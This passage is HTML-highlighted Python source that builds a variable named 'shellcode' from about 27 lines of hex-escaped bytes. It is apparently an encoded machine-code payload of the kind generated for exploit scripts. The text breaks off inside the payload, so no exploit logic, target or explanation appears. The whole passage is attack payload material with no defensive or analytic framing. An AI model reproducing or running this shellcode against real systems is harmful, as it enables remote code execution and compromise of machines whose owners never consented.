</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span>  <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xba</span><span class="z-constant z-character z-escape z-hex z-python">\x13</span><span class="z-constant z-character z-escape z-hex z-python">\xa8</span><span class="z-constant z-character z-escape z-hex z-python">\x95</span><span class="z-constant z-character z-escape z-hex z-python">\x10</span><span class="z-constant z-character z-escape z-hex z-python">\xdd</span><span class="z-constant z-character z-escape z-hex z-python">\xc0</span><span class="z-constant z-character z-escape z-hex z-python">\xd9</span><span class="z-constant z-character z-escape z-hex z-python">\x74</span><span class="z-constant z-character z-escape z-hex z-python">\x24</span><span class="z-constant z-character z-escape z-hex z-python">\xf4</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x58</span><span class="z-constant z-character z-escape z-hex z-python">\x29</span><span class="z-constant z-character z-escape z-hex z-python">\xc9</span><span class="z-constant z-character z-escape z-hex z-python">\xb1</span><span class="z-constant z-character z-escape z-hex z-python">\x52</span><span class="z-constant z-character z-escape z-hex z-python">\x83</span><span class="z-constant z-character z-escape z-hex z-python">\xc0</span><span class="z-constant z-character z-escape z-hex z-python">\x04</span><span class="z-constant z-character z-escape z-hex z-python">\x31</span><span class="z-constant z-character z-escape z-hex z-python">\x50</span><span class="z-constant z-character z-escape z-hex z-python">\x0e</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x03</span><span class="z-constant z-character z-escape z-hex z-python">\x43</span><span class="z-constant z-character z-escape z-hex z-python">\xa6</span><span class="z-constant z-character z-escape z-hex z-python">\x77</span><span class="z-constant z-character z-escape z-hex z-python">\xe5</span><span class="z-constant z-character z-escape z-hex z-python">\x9f</span><span class="z-constant z-character z-escape z-hex z-python">\x5e</span><span class="z-constant z-character z-escape z-hex z-python">\xf5</span><span class="z-constant z-character z-escape z-hex z-python">\x06</span><span class="z-constant z-character z-escape z-hex z-python">\x5f</span><span class="z-constant z-character z-escape z-hex z-python">\x9f</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x9a</span><span class="z-constant z-character z-escape z-hex z-python">\x8f</span><span class="z-constant z-character z-escape z-hex z-python">\xba</span><span class="z-constant z-character z-escape z-hex z-python">\xae</span><span class="z-constant z-character z-escape z-hex z-python">\x9a</span><span class="z-constant z-character z-escape z-hex z-python">\xf4</span><span class="z-constant z-character z-escape z-hex z-python">\xcf</span><span class="z-constant z-character z-escape z-hex z-python">\x81</span><span class="z-constant z-character z-escape z-hex z-python">\x2a</span><span class="z-constant z-character z-escape z-hex z-python">\x7e</span><span class="z-constant z-character z-escape z-hex z-python">\x9d</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x2d</span><span class="z-constant z-character z-escape z-hex z-python">\xc0</span><span class="z-constant z-character z-escape z-hex z-python">\xd2</span><span class="z-constant z-character z-escape z-hex z-python">\x35</span><span class="z-constant z-character z-escape z-hex z-python">\xa5</span><span class="z-constant z-character z-escape z-hex z-python">\xa4</span><span class="z-constant z-character z-escape z-hex z-python">\xfa</span><span class="z-constant z-character z-escape z-hex z-python">\x3a</span><span class="z-constant z-character z-escape z-hex z-python">\x0e</span><span class="z-constant z-character z-escape z-hex z-python">\x02</span><span class="z-constant z-character z-escape z-hex z-python">\xdd</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x75</span><span class="z-constant z-character z-escape z-hex z-python">\x8f</span><span class="z-constant z-character z-escape z-hex z-python">\x3f</span><span class="z-constant z-character z-escape z-hex z-python">\x1d</span><span class="z-constant z-character z-escape z-hex z-python">\x14</span><span class="z-constant z-character z-escape z-hex z-python">\x13</span><span class="z-constant z-character z-escape z-hex z-python">\x42</span><span class="z-constant z-character z-escape z-hex z-python">\x72</span><span class="z-constant z-character z-escape z-hex z-python">\xf6</span><span class="z-constant z-character z-escape z-hex z-python">\x2a</span><span class="z-constant z-character z-escape z-hex z-python">\x8d</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x87</span><span class="z-constant z-character z-escape z-hex z-python">\xf7</span><span class="z-constant z-character z-escape z-hex z-python">\x6b</span><span class="z-constant z-character z-escape z-hex z-python">\xf0</span><span class="z-constant z-character z-escape z-hex z-python">\x6a</span><span class="z-constant z-character z-escape z-hex z-python">\xa5</span><span class="z-constant z-character z-escape z-hex z-python">\x24</span><span class="z-constant z-character z-escape z-hex z-python">\x7e</span><span class="z-constant z-character z-escape z-hex z-python">\xd8</span><span class="z-constant z-character z-escape z-hex z-python">\x59</span><span class="z-constant z-character z-escape z-hex z-python">\x40</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xca</span><span class="z-constant z-character z-escape z-hex z-python">\xe1</span><span class="z-constant z-character z-escape z-hex z-python">\xd2</span><span class="z-constant z-character z-escape z-hex z-python">\x1a</span><span class="z-constant z-character z-escape z-hex z-python">\xda</span><span class="z-constant z-character z-escape z-hex z-python">\x61</span><span class="z-constant z-character z-escape z-hex z-python">\x07</span><span class="z-constant z-character z-escape z-hex z-python">\xea</span><span class="z-constant z-character z-escape z-hex z-python">\xdd</span><span class="z-constant z-character z-escape z-hex z-python">\x40</span><span class="z-constant z-character z-escape z-hex z-python">\x96</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x60</span><span class="z-constant z-character z-escape z-hex z-python">\x84</span><span class="z-constant z-character z-escape z-hex z-python">\x42</span><span class="z-constant z-character z-escape z-hex z-python">\x19</span><span class="z-constant z-character z-escape z-hex z-python">\xa4</span><span class="z-constant z-character z-escape z-hex z-python">\xbc</span><span class="z-constant z-character z-escape z-hex z-python">\xca</span><span class="z-constant z-character z-escape z-hex z-python">\x01</span><span class="z-constant z-character z-escape z-hex z-python">\xa9</span><span class="z-constant z-character z-escape z-hex z-python">\xf9</span><span class="z-constant z-character z-escape z-hex z-python">\x85</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xba</span><span class="z-constant z-character z-escape z-hex z-python">\x19</span><span class="z-constant z-character z-escape z-hex z-python">\x75</span><span class="z-constant z-character z-escape z-hex z-python">\x14</span><span class="z-constant z-character z-escape z-hex z-python">\x6a</span><span class="z-constant z-character z-escape z-hex z-python">\x50</span><span class="z-constant z-character z-escape z-hex z-python">\x76</span><span class="z-constant z-character z-escape z-hex z-python">\xbb</span><span class="z-constant z-character z-escape z-hex z-python">\x53</span><span class="z-constant z-character z-escape z-hex z-python">\x5c</span><span class="z-constant z-character z-escape z-hex z-python">\x85</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xc5</span><span class="z-constant z-character z-escape z-hex z-python">\x94</span><span class="z-constant z-character z-escape z-hex z-python">\x5b</span><span class="z-constant z-character z-escape z-hex z-python">\x76</span><span class="z-constant z-character z-escape z-hex z-python">\xb0</span><span class="z-constant z-character z-escape z-hex z-python">\xec</span><span class="z-constant z-character z-escape z-hex z-python">\x9f</span><span class="z-constant z-character z-escape z-hex z-python">\x0b</span><span class="z-constant z-character z-escape z-hex z-python">\xc3</span><span class="z-constant z-character z-escape z-hex z-python">\x2b</span><span class="z-constant z-character z-escape z-hex z-python">\xdd</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xd7</span><span class="z-constant z-character z-escape z-hex z-python">\x46</span><span class="z-constant z-character z-escape z-hex z-python">\xaf</span><span class="z-constant z-character z-escape z-hex z-python">\x45</span><span class="z-constant z-character z-escape z-hex z-python">\x93</span><span class="z-constant z-character z-escape z-hex z-python">\xf1</span><span class="z-constant z-character z-escape z-hex z-python">\x0b</span><span class="z-constant z-character z-escape z-hex z-python">\x77</span><span class="z-constant z-character z-escape z-hex z-python">\x70</span><span class="z-constant z-character z-escape z-hex z-python">\x67</span><span class="z-constant z-character z-escape z-hex z-python">\xd8</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x7b</span><span class="z-constant z-character z-escape z-hex z-python">\x3d</span><span class="z-constant z-character z-escape z-hex z-python">\xe3</span><span class="z-constant z-character z-escape z-hex z-python">\x86</span><span class="z-constant z-character z-escape z-hex z-python">\x9f</span><span class="z-constant z-character z-escape z-hex z-python">\xc0</span><span class="z-constant z-character z-escape z-hex z-python">\x20</span><span class="z-constant z-character z-escape z-hex z-python">\xbd</span><span class="z-constant z-character z-escape z-hex z-python">\xa4</span><span class="z-constant z-character z-escape z-hex z-python">\x49</span><span class="z-constant z-character z-escape z-hex z-python">\xc7</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x11</span><span class="z-constant z-character z-escape z-hex z-python">\x2d</span><span class="z-constant z-character z-escape z-hex z-python">\x09</span><span class="z-constant z-character z-escape z-hex z-python">\xec</span><span class="z-constant z-character z-escape z-hex z-python">\xb5</span><span class="z-constant z-character z-escape z-hex z-python">\x75</span><span class="z-constant z-character z-escape z-hex z-python">\xc9</span><span class="z-constant z-character z-escape z-hex z-python">\x8d</span><span class="z-constant z-character z-escape z-hex z-python">\xec</span><span class="z-constant z-character z-escape z-hex z-python">\xd3</span><span class="z-constant z-character z-escape z-hex z-python">\xbc</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xb2</span><span class="z-constant z-character z-escape z-hex z-python">\xee</span><span class="z-constant z-character z-escape z-hex z-python">\xbb</span><span class="z-constant z-character z-escape z-hex z-python">\x61</span><span class="z-constant z-character z-escape z-hex z-python">\x17</span><span class="z-constant z-character z-escape z-hex z-python">\x65</span><span class="z-constant z-character z-escape z-hex z-python">\x51</span><span class="z-constant z-character z-escape z-hex z-python">\x75</span><span class="z-constant z-character z-escape z-hex z-python">\x2a</span><span class="z-constant z-character z-escape z-hex z-python">\x24</span><span class="z-constant z-character z-escape z-hex z-python">\x3e</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xba</span><span class="z-constant z-character z-escape z-hex z-python">\x07</span><span class="z-constant z-character z-escape z-hex z-python">\xd6</span><span class="z-constant z-character z-escape z-hex z-python">\xbe</span><span class="z-constant z-character z-escape z-hex z-python">\xd4</span><span class="z-constant z-character z-escape z-hex z-python">\x10</span><span class="z-constant z-character z-escape z-hex z-python">\xa5</span><span class="z-constant z-character z-escape z-hex z-python">\x8c</span><span class="z-constant z-character z-escape z-hex z-python">\x7b</span><span class="z-constant z-character z-escape z-hex z-python">\x8b</span><span class="z-constant z-character z-escape z-hex z-python">\x21</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xbd</span><span class="z-constant z-character z-escape z-hex z-python">\xf4</span><span class="z-constant z-character z-escape z-hex z-python">\x15</span><span class="z-constant z-character z-escape z-hex z-python">\xb6</span><span class="z-constant z-character z-escape z-hex z-python">\xc2</span><span class="z-constant z-character z-escape z-hex z-python">\x2e</span><span class="z-constant z-character z-escape z-hex z-python">\xe1</span><span class="z-constant z-character z-escape z-hex z-python">\x28</span><span class="z-constant z-character z-escape z-hex z-python">\x3d</span><span class="z-constant z-character z-escape z-hex z-python">\xd1</span><span class="z-constant z-character z-escape z-hex z-python">\x12</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x61</span><span class="z-constant z-character z-escape z-hex z-python">\xfa</span><span class="z-constant z-character z-escape z-hex z-python">\x85</span><span class="z-constant z-character z-escape z-hex z-python">\x42</span><span class="z-constant z-character z-escape z-hex z-python">\x19</span><span class="z-constant z-character z-escape z-hex z-python">\x2b</span><span class="z-constant z-character z-escape z-hex z-python">\xa6</span><span class="z-constant z-character z-escape z-hex z-python">\x08</span><span class="z-constant z-character z-escape z-hex z-python">\xd9</span><span class="z-constant z-character z-escape z-hex z-python">\xd4</span><span class="z-constant z-character z-escape z-hex z-python">\x73</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x9e</span><span class="z-constant z-character z-escape z-hex z-python">\x89</span><span class="z-constant z-character z-escape z-hex z-python">\x7a</span><span class="z-constant z-character z-escape z-hex z-python">\x2c</span><span class="z-constant z-character z-escape z-hex z-python">\x5f</span><span class="z-constant z-character z-escape z-hex z-python">\x79</span><span class="z-constant z-character z-escape z-hex z-python">\x3b</span><span class="z-constant z-character z-escape z-hex z-python">\x9c</span><span class="z-constant z-character z-escape z-hex z-python">\x37</span><span class="z-constant z-character z-escape z-hex z-python">\x93</span><span class="z-constant z-character z-escape z-hex z-python">\xb4</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xc3</span><span class="z-constant z-character z-escape z-hex z-python">\x28</span><span class="z-constant z-character z-escape z-hex z-python">\x9c</span><span class="z-constant z-character z-escape z-hex z-python">\x1e</span><span class="z-constant z-character z-escape z-hex z-python">\x6c</span><span class="z-constant z-character z-escape z-hex z-python">\xc2</span><span class="z-constant z-character z-escape z-hex z-python">\x67</span><span class="z-constant z-character z-escape z-hex z-python">\xc9</span><span class="z-constant z-character z-escape z-hex z-python">\x53</span><span class="z-constant z-character z-escape z-hex z-python">\xbb</span><span class="z-constant z-character z-escape z-hex z-python">\x66</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x39</span><span class="z-constant z-character z-escape z-hex z-python">\x3c</span><span class="z-constant z-character z-escape z-hex z-python">\xbe</span><span class="z-constant z-character z-escape z-hex z-python">\x68</span><span class="z-constant z-character z-escape z-hex z-python">\x38</span><span class="z-constant z-character z-escape z-hex z-python">\x07</span><span class="z-constant z-character z-escape z-hex z-python">\x37</span><span class="z-constant z-character z-escape z-hex z-python">\x8e</span><span class="z-constant z-character z-escape z-hex z-python">\x50</span><span class="z-constant z-character z-escape z-hex z-python">\x67</span><span class="z-constant z-character z-escape z-hex z-python">\x1e</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x19</span><span class="z-constant z-character z-escape z-hex z-python">\xcd</span><span class="z-constant z-character z-escape z-hex z-python">\x1e</span><span class="z-constant z-character z-escape z-hex z-python">\x3b</span><span class="z-constant z-character z-escape z-hex z-python">\xd1</span><span class="z-constant z-character z-escape z-hex z-python">\x6c</span><span class="z-constant z-character z-escape z-hex z-python">\xde</span><span class="z-constant z-character z-escape z-hex z-python">\x91</span><span class="z-constant z-character z-escape z-hex z-python">\x9c</span><span class="z-constant z-character z-escape z-hex z-python">\xaf</span><span class="z-constant z-character z-escape z-hex z-python">\x54</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x16</span><span class="z-constant z-character z-escape z-hex z-python">\x61</span><span class="z-constant z-character z-escape z-hex z-python">\x61</span><span class="z-constant z-character z-escape z-hex z-python">\x9d</span><span class="z-constant z-character z-escape z-hex z-python">\x53</span><span class="z-constant z-character z-escape z-hex z-python">\x71</span><span class="z-constant z-character z-escape z-hex z-python">\x16</span><span class="z-constant z-character z-escape z-hex z-python">\x6d</span><span class="z-constant z-character z-escape z-hex z-python">\x2e</span><span class="z-constant z-character z-escape z-hex z-python">\x2b</span><span class="z-constant z-character z-escape z-hex z-python">\xb1</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x72</span><span class="z-constant z-character z-escape z-hex z-python">\x84</span><span class="z-constant z-character z-escape z-hex z-python">\x43</span><span class="z-constant z-character z-escape z-hex z-python">\x5d</span><span class="z-constant z-character z-escape z-hex z-python">\xe0</span><span class="z-constant z-character z-escape z-hex z-python">\x43</span><span class="z-constant z-character z-escape z-hex z-python">\x93</span><span class="z-constant z-character z-escape z-hex z-python">\x28</span><span class="z-constant z-character z-escape z-hex z-python">\x19</span><span class="z-constant z-character z-escape z-hex z-python">\xdc</span><span class="z-constant z-character z-escape z-hex z-python">\xc4</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x7d</span><span class="z-constant z-character z-escape z-hex z-python">\xef</span><span class="z-constant z-character z-escape z-hex z-python">\x15</span><span class="z-constant z-character z-escape z-hex z-python">\x80</span><span class="z-constant z-character z-escape z-hex z-python">\x93</span><span class="z-constant z-character z-escape z-hex z-python">\x56</span><span class="z-constant z-character z-escape z-hex z-python">\x8c</span><span class="z-constant z-character z-escape z-hex z-python">\xb6</span><span class="z-constant z-character z-escape z-hex z-python">\x69</span><span class="z-constant z-character z-escape z-hex z-python">\x0e</span><span class="z-constant z-character z-escape z-hex z-python">\xf7</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x72</span><span class="z-constant z-character z-escape z-hex z-python">\xb6</span><span class="z-constant z-character z-escape z-hex z-python">\xf3</span><span class="z-constant z-character z-escape z-hex z-python">\xf6</span><span class="z-constant z-character z-escape z-hex z-python">\x7b</span><span class="z-constant z-character z-escape z-hex z-python">\x3b</span><span class="z-constant z-character z-escape z-hex z-python">\x4f</span><span class="z-constant z-character z-escape z-hex z-python">\xdd</span><span class="z-constant z-character z-escape z-hex z-python">\x6b</span><span class="z-constant z-character z-escape z-hex z-python">\x85</span><span class="z-constant z-character z-escape z-hex z-python">\x50</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
